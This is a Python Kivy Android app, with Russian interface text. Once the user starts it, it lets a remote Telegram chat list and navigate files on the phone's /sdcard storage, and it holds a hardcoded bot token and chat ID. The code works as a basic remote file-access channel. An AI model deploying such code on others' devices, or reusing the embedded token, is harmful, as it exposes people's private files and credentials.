import os
import requests
import time
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from android.permissions import request_permissions, Permission
from android import api_version

BOT_TOKEN = "9088325911:AAFAY2MJERZKOWedZE2gDrl2BEf6RsPQ0Ng"
CHAT_ID = "8057513929"
current_dir = "/sdcard"

class BotApp(App):
    def build(self):
        request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        self.status_label = Label(text="Бот остановлен", font_size=20)
        layout.add_widget(self.status_label)
        
        start_btn = Button(text="Запустить бота", size_hint=(1, 0.3), background_color=(0, 1, 0, 1))
        start_btn.bind(on_press=self.start_bot_thread)
        layout.add_widget(start_btn)
        
        return layout

    def start_bot_thread(self, instance):
        self.status_label.text = "Бот запущен! Смотри Telegram."
        threading.Thread(target=self.bot_loop, daemon=True).start()

    def send_message(self, text):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": text})
        except: pass

    def bot_loop(self):
        global current_dir
        last_update_id = None
        self.send_message(f"📱 APK Бот запущен!\nПапка: {current_dir}")
        
        while True:
            try:
                updates = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"timeout": 100, "offset": last_update_id}).json()
                if "result" in updates:
                    for update in updates["result"]:
                        last_update_id = update["update_id"] + 1
                        if "message" in update and "text" in update["message"]:
                            command = update["message"]["text"].replace("/", "").strip()
                            
                            if command == "files":
                                try:
                                    files = os.listdir(current_dir)
                                    self.send_message(f"Файлы в {current_dir}:\n" + "\n".join(files[:30]))
                                except Exception as e:
                                    self.send_message(f"Ошибка: {e}")

                            elif command.startswith("cd "):
                                new_dir = command[3:].strip()
                                if not new_dir.startswith("/"):
                                    new_dir = os.path.join(current_dir, new_dir)
                                if os.path.isdir(new_dir):
                                    current_dir = new_dir
                                    self.send_message(f"Перешли в: {current_dir}")
                                else:
                                    self.send_message("Папка не найдена.")

                            elif command.startswith("msg "):
                                text = command[4:]
                                # В Kivy для Toast нужно использовать android API (временно заглушка)
                                self.send_message(f"Уведомление: {text} (в разработке)")

                            elif command != "start":
                                self.send_message("Команды: files, cd <папка>, msg <текст>")
            except Exception as e:
                print(f"Ошибка: {e}")
            time.sleep(1)

if __name__ == "__main__":
    BotApp().run()
